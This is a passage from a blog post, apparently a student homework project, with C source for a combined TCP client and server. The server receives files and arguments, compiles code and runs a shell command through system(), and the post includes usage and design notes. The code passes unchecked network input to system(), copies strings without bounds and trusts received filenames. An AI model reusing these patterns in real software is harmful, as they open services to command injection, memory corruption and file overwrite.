class=\"string\">\"CLIENT: \"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"%s\"</span>,msg);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to send message</span><br><span class=\"line\"> * @param</span><br><span class=\"line\"> *      c_sock: the socket which the message will send to</span><br><span class=\"line\"> *      msg: the message</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> sendmessage(<span class=\"keyword\">int</span> c_sock, <span class=\"keyword\">char</span> *msg)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span>, msg);</span><br><span class=\"line\">    send(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to send files</span><br><span class=\"line\"> * @param</span><br><span class=\"line\"> *      c_sock: the socket which the message will send to</span><br><span class=\"line\"> *      filename: the file name of the file that is needed to be sent</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> sendfile(<span class=\"keyword\">int</span> c_sock, <span class=\"keyword\">char</span> *filename)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    FILE *fp = fopen(filename, <span class=\"string\">\"r\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(NULL == fp)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">3</span>);</span><br><span class=\"line\">        printf(<span class=\"string\">\"%s isn\\'t exist\\n\"</span>,filename);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(fgets(<span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, fp) != NULL)&#123;<span class=\"comment\">//get the file line by line and send it</span></span><br><span class=\"line\">        printf(<span class=\"string\">\"%s\"</span>,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">        send(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * the main function of client part</span><br><span class=\"line\"> * @param</span><br><span class=\"line\"> *      args: the arguments that should be sent to the server</span><br><span class=\"line\"> *      addr: the address information of client</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> client(<span class=\"keyword\">char</span> * args, <span class=\"keyword\">struct</span> sockaddr_in addr)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sock,i;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE];</span><br><span class=\"line\">    sock = socket(PF_INET, SOCK_STREAM, <span class=\"number\">0</span>);<span class=\"comment\">//use ipv4/tcp/ip to transform</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(sock &lt; <span class=\"number\">0</span>)&#123;<span class=\"comment\">//fail to initiate the socket</span></span><br><span class=\"line\">        errorout(<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">3</span>;++ i)&#123;<span class=\"comment\">//if the client tries to connect the server failed, try three times in total</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">connect</span>(sock, (<span class=\"keyword\">struct</span> sockaddr *)&amp;addr, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> sockaddr)) &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            errorout(<span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"built_in\">if</span>(i == <span class=\"number\">2</span>) &#123;<span class=\"comment\">// three times later, the client part will exit</span></span><br><span class=\"line\">                errorout(<span class=\"number\">2</span>);</span><br><span class=\"line\">                <span class=\"built_in\">return</span> <span class=\"number\">-2</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//try to connect to the server 3 seconds later</span></span><br><span class=\"line\">            outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Try to reconnect 3 seconds later\\n\"</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">            outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Try to reconnect 2 seconds later\\n\"</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">            outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Try to reconnect 1 second later\\n\"</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outputmsg(<span class=\"number\">0</span>,<span class=\"string\">\"Connected to the server\\n\"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__START__TRANSMISSION\\n__START__FILELIST\\n\"</span>);<span class=\"comment\">//output the names of files</span></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = <span class=\"number\">0</span>;i &lt; FILE_NUM;++ i) printf(<span class=\"string\">\"%s\\n\"</span>,files[i]);</span><br><span class=\"line\">    sendmessage(sock, <span class=\"string\">\"__START__\"</span>);<span class=\"comment\">//send the file list (config) to the server</span></span><br><span class=\"line\">    sendmessage(sock,<span class=\"string\">\"config\"</span>);</span><br><span class=\"line\">    sendfile(sock, <span class=\"string\">\"config\"</span>);</span><br><span class=\"line\">    sendmessage(sock, <span class=\"string\">\"__END__\"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__FILELIST\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = <span class=\"number\">0</span>;i &lt; FILE_NUM;++ i)&#123;<span class=\"comment\">//output the names and send messages and files to server        sendmessage(sock, \"__START__\");//if the cil</span></span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__START__\"</span>);<span class=\"comment\">//if the client sends the \"__START__\" message, it means there will be a new file to send</span></span><br><span class=\"line\">        sendmessage(sock, files[i]);<span class=\"comment\">//send the name of the file</span></span><br><span class=\"line\">        printf(<span class=\"string\">\"__START__%s\\n\"</span>,files[i]);</span><br><span class=\"line\">        sendfile(sock, files[i]);<span class=\"comment\">//send this file</span></span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__END__\"</span>);<span class=\"comment\">//if the client sends the \"__END__\", means it's the end of a file</span></span><br><span class=\"line\">        printf(<span class=\"string\">\"__END__%s\\n\"</span>,files[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(<span class=\"string\">\"__START__ARGs\\n\"</span>);</span><br><span class=\"line\">    sendmessage(sock,<span class=\"string\">\"__ARGs__\"</span>);<span class=\"comment\">//if the client sends the \"__ARGs__\", means the next message will be the atgs</span></span><br><span class=\"line\">    sendmessage(sock,args);</span><br><span class=\"line\">    printf(<span class=\"string\">\"%s\\n\"</span>,args);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__ARGs\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = FILE_NUM;i &lt; filenum;++ i)&#123;<span class=\"comment\">//send the files which are needed to format</span></span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__START__\"</span>);</span><br><span class=\"line\">        sendmessage(sock, files[i]);</span><br><span class=\"line\">        printf(<span class=\"string\">\"__START__%s_TO_FORMAT\\n\"</span>,files[i]);</span><br><span class=\"line\">        sendfile(sock, files[i]);</span><br><span class=\"line\">        sendmessage(sock, <span class=\"string\">\"__END__\"</span>);</span><br><span class=\"line\">        printf(<span class=\"string\">\"__END__%s_TO_FORMAT\\n\"</span>,files[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sendmessage(sock,<span class=\"string\">\"__TRANS END__\"</span>);</span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__TRANSMISSION\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>((len = recv(sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>)) &gt; <span class=\"number\">0</span>)&#123;<span class=\"comment\">//recv the answer from server</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(!flag) printf(<span class=\"string\">\"__START__RESULT\\n\"</span>);<span class=\"comment\">//before the first line of answer, print this. in order to avoid the other process distroy the output, this message should be printed after it recvs the answer</span></span><br><span class=\"line\">        flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">buffer</span>[len] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        printf(<span class=\"string\">\"%s\"</span>,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    printf(<span class=\"string\">\"__END__RESULT\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">close</span>(sock);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is the main function of server part</span><br><span class=\"line\"> * @param addr: the address of the server</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * in order to avoid the same file name with the original filename,</span><br><span class=\"line\"> * the server part will work in the ./s_temp/ folder</span><br><span class=\"line\"> * the files recieved by the server will be stored in this folder</span><br><span class=\"line\"> * and the answer will also be generated there</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> server(<span class=\"keyword\">struct</span> sockaddr_in s_addr)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> s_sock,c_sock;<span class=\"comment\">//means the server sockets and the client sockets</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> args[BUFFER_SIZE];<span class=\"comment\">//args means the arguments</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> sockaddr_in c_addr;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[BUFFER_SIZE];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> filename[<span class=\"number\">100</span>] = &#123;<span class=\"string\">\"./s_temp/\"</span>&#125;;<span class=\"comment\">//the filename started with ./s_temp/</span></span><br><span class=\"line\">    FILE *fp = NULL;</span><br><span class=\"line\">    s_sock = socket(PF_INET, SOCK_STREAM, <span class=\"number\">0</span>);<span class=\"comment\">//init the socket</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(s_sock &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//bind the socket with the ip address</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(bind(s_sock, (<span class=\"keyword\">struct</span> sockaddr *)&amp;s_addr, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> sockaddr)) &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">-2</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"Server starts to listen\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">listen</span>(s_sock, A_LEN);<span class=\"comment\">//listen to the rhythm of the falling client</span></span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"A client tries to connect\\n\"</span>);<span class=\"comment\">//telling me just what a waitting the server've been</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> addrlen;</span><br><span class=\"line\">    c_sock = accept(s_sock, (<span class=\"keyword\">struct</span> sockaddr *)&amp;c_addr, &amp;addrlen);<span class=\"comment\">//I wish that it would go and let a client connect me</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"SERVER: User %d connected\\n\"</span>,c_sock);<span class=\"comment\">//and let users know again</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(c_sock &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">-3</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len = <span class=\"number\">0</span>,f_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">    system(<span class=\"string\">\"mkdir s_temp\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">while</span>((len = recv(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>)) &gt; <span class=\"number\">0</span>)&#123;<span class=\"comment\">//Now the messages i've received has been stored</span></span><br><span class=\"line\">        <span class=\"built_in\">buffer</span>[len] = <span class=\"number\">0</span>;<span class=\"comment\">//Looking for a end of the line</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__START__\"</span>) == <span class=\"number\">0</span>) &#123;<span class=\"comment\">//little does message know that when it means a new file</span></span><br><span class=\"line\">            len = recv(c_sock, <span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>);<span class=\"comment\">//Receive the name and open the file</span></span><br><span class=\"line\">            <span class=\"built_in\">buffer</span>[len] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            strcpy(filename + <span class=\"number\">9</span>, <span class=\"built_in\">buffer</span>);<span class=\"comment\">//\"+9 means the length of \"./s_temp/\" after this, the filename will be \"./s_temp/buffer\". \"</span></span><br><span class=\"line\">            fp = fopen(filename,<span class=\"string\">\"w\"</span>);<span class=\"comment\">//\"the file will be stored in the ./s_temp/\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__END__\"</span>) == <span class=\"number\">0</span>)&#123;<span class=\"comment\">//Client please tell me now does this a file's end</span></span><br><span class=\"line\">            fclose(fp);</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__TRANS END__\"</span>) == <span class=\"number\">0</span>) <span class=\"built_in\">break</span>;<span class=\"comment\">//For this is the end of the trans precess</span></span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(strcmp(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"__ARGs__\"</span>) == <span class=\"number\">0</span>)&#123;<span class=\"comment\">//I can't work fine when the arguement's somewhere far away</span></span><br><span class=\"line\">            len = recv(c_sock, args, BUFFER_SIZE - <span class=\"number\">2</span>, <span class=\"number\">0</span>);<span class=\"comment\">//receive the args of the fmt</span></span><br><span class=\"line\">            args[len] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(fp) fputs(<span class=\"built_in\">buffer</span>, fp);<span class=\"comment\">//output the things into a file</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(!fp) printf(<span class=\"string\">\"%s\"</span>,<span class=\"built_in\">buffer</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"Output from server to handle files\\n\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"make task1\"</span>);<span class=\"comment\">//gcc combine.c -o combine</span></span><br><span class=\"line\">    len = <span class=\"number\">13</span>;</span><br><span class=\"line\">    <span class=\"comment\">//the run fmt command will be generated here</span></span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span>, <span class=\"string\">\"./s_temp/fmt \"</span>);<span class=\"comment\">//starts with this</span></span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span> + <span class=\"number\">13</span>, args);<span class=\"comment\">//13 means the length of \"./s_temp/fmt\", the args will be copyed after this</span></span><br><span class=\"line\">    len += strlen(args);<span class=\"comment\">//len += length of args</span></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = FILE_NUM;i &lt; filenum;++ i)&#123;</span><br><span class=\"line\">        strcpy(<span class=\"built_in\">buffer</span> + len, <span class=\"string\">\"./s_temp/\"</span>);<span class=\"comment\">//after the args, the files which needs to format will be appended one by one, before every file, we will add \"./s_temp/\" </span></span><br><span class=\"line\">        len += <span class=\"number\">9</span>;</span><br><span class=\"line\">        strcpy(<span class=\"built_in\">buffer</span> + len, files[i]);</span><br><span class=\"line\">        len += strlen(files[i]);</span><br><span class=\"line\">        <span class=\"built_in\">buffer</span>[len ++] = <span class=\"string\">' '</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    strcpy(<span class=\"built_in\">buffer</span> + len, <span class=\"string\">\" &gt; ./s_temp/output\"</span>);<span class=\"comment\">//adds the output</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"args=%s\\n\"</span>,<span class=\"built_in\">buffer</span>);<span class=\"comment\">//output the command</span></span><br><span class=\"line\">    system(<span class=\"built_in\">buffer</span>);<span class=\"comment\">//run the command</span></span><br><span class=\"line\">    outputmsg(<span class=\"number\">1</span>,<span class=\"string\">\"Server output finished\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile(c_sock, <span class=\"string\">\"./s_temp/output\"</span>);<span class=\"comment\">//send the answer back to the client</span></span><br><span class=\"line\">    <span class=\"built_in\">close</span>(c_sock);</span><br><span class=\"line\">    <span class=\"built_in\">close</span>(s_sock);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"><span class=\"keyword\">int</span> main(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c_sock,i,len = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> sockaddr_in addr;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[<span class=\"number\">200</span>];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> args[<span class=\"number\">1000</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *IP = <span class=\"string\">\"127.0.0.1\"</span>;<span class=\"comment\">//the init IP</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> port = <span class=\"number\">9585</span>;</span><br><span class=\"line\">    FILE *fp = fopen(<span class=\"string\">\"./config\"</span>,<span class=\"string\">\"r\"</span>);<span class=\"comment\">//read the config file</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(NULL == fp)&#123;</span><br><span class=\"line\">        errorout(<span class=\"number\">4</span>);</span><br><span class=\"line\">        <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    fgets(<span class=\"built_in\">buffer</span>, BUFFER_SIZE - <span class=\"number\">2</span>, fp);</span><br><span class=\"line\">    filenum = atoi(<span class=\"built_in\">buffer</span>);<span class=\"comment\">//the first line will be the number of files</span></span><br><span class=\"line\">    filenum += FILE_NUM;<span class=\"comment\">//FILE_NUM means the number of code files</span></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(i = FILE_NUM;i &lt; filenum;++ i)&#123;<span class=\"comment\">//read the file names from config </span></span><br><span class=\"line\">        fgets(files[i], <span class=\"number\">100</span>, fp);</span><br><span class=\"line\">        files[i][strlen(files[i]) - <span class=\"number\">1</span>] = <span class=\"number\">0</span>;<span class=\"comment\">//remove the '\\n' after each filename</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//if the arguments exist, replace the IP and port address</span></span><br><span class=\"line\">    <span class=\"built_in\">if</span>(argc &gt; <span class=\"number\">1</span>) IP = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(argc &gt; <span class=\"number\">2</span>) port = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    printf(<span class=\"string\">\"IP: %s\\n\"</span>,IP);</span><br><span class=\"line\">    printf(<span class=\"string\">\"port: %d\\n\"</span>,port);</span><br><span class=\"line\"></span><br><span class=\"line\">    fgets(<span class=\"built_in\">buffer</span>,<span class=\"number\">100</span>, fp);<span class=\"comment\">// get the argument of the fmt from the last line of the config</span></span><br><span class=\"line\">    <span class=\"built_in\">buffer</span>[strlen(<span class=\"built_in\">buffer</span>) - <span class=\"number\">1</span>] = <span class=\"string\">' '</span>;</span><br><span class=\"line\">    addr.sin_family = AF_INET;<span class=\"comment\">//init the address information of client and server</span></span><br><span class=\"line\">    addr.sin_addr.s_addr = inet_addr(IP);</span><br><span class=\"line\">    addr.sin_port = htons(port);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> id = fork();</span><br><span class=\"line\">    <span class=\"built_in\">if</span>(!id) client(<span class=\"built_in\">buffer</span>, addr);<span class=\"comment\">//the subprocess will take the client part</span></span><br><span class=\"line\">    <span class=\"built_in\">else</span> server(addr);<span class=\"comment\">//the main process will work as the server part</span></span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>Author: Song Li<br><a href=\"/download/sol315_HW3.zip\">Download Project</a></p>\n<p>##AIM##<br>This program is used to transform files from client to server, the server will run the received code and return the answer to the client. The client part and the server part are combined to a single program. Using “fork()” function to make them work separately.</p>","more":"<p>##USAGE##<br>Configure file:<br>The configure file is named “config”. The first line of the file is the number of the files that needed to format. The name of each file should be put line by line right after the first line. At the end of the file, input the argument to the “fmt” function. Here is the</p>\n<p>###example###</p>\n<blockquote>\n<p>2<br>Test<br>Test2<br>-w 10 -u</p>\n</blockquote>\n<p>###Arguments###<br>The IP address and the port number will be the arguments. Users can just input<br>the IP address and the port number just follow the “./combine”. Here is an example:</p>\n<blockquote>\n<p>./combine 127.0.0.1 9876</p>\n</blockquote>\n<p>##COMPILE##<br>Type “make” to compile the source code.</p>\n<p>##FILE STRUCTURE##</p>\n<blockquote>\n<p>fmt.c: the main code of this fmt.c<br>combine.c: the code of this program<br>makefile: the makefile document to compile the code<br>test: the first test file<br>test2: the second test file<br>config: the config file used by the program<br>Readme.pdf: this readme document</p>\n</blockquote>\n<p>##RESULT##<br>This program will have two processes, the files will be read from the client part and be sent to the server part. The server part will then receive these files, store them to the “./s_temp” folder, compile the fmt.c code, run it and return the answer to the client part.</p>\n<p>##DESIGN##<br>1) Connection refused: Since the server and client runs separately, when the client tries to connect the server, the server may not initiated yet. Every time when the client fails to connect the server, it will try to reconnect 3 seconds later again. If the client tries to reconnect 3 times and still not connected, it will give up and exit.<br>2) Avoid the same file name: As the client and the server are indeed one program, they work in a same directory. In order to avoid the change to this directory, all of the server’s work will be done in the “./s_temp/“ directory. Files received will be storied in “./s_temp/“, and they will be compiled there, they will run there, and they will get the answer there. </p>\n<p>here is the code:</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span 